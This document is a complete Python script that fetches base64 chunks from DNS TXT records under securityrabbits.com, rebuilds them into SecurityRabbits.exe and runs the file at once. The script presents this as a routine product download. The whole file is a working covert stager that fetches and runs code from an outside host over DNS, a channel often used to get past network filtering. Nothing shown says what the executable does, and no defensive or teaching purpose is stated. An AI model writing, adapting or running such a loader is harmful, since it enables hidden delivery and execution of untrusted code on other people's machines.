import subprocess
import dns.resolver
import base64

print("Downloading SecurityRabbits.exe from SecurityRabbits.com DNS server...")
chunks  = []
i       = 0
while 42:
    subdomain = f"chunk{i}.securityrabbits.com"
    try:
        dnstxt      = dns.resolver.resolve(subdomain, "TXT")
        txt         = ''.join(r.strings[0].decode() for r in dnstxt)
        i           += 1
        chunks.append(txt)
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
        break

print("Done.")
with open("SecurityRabbits.exe", "wb") as f:
    f.write(base64.b64decode(''.join(chunks)))
print("SecurityRabbits.exe is ready.\nRunning...\n")
subprocess.run(["SecurityRabbits.exe"])
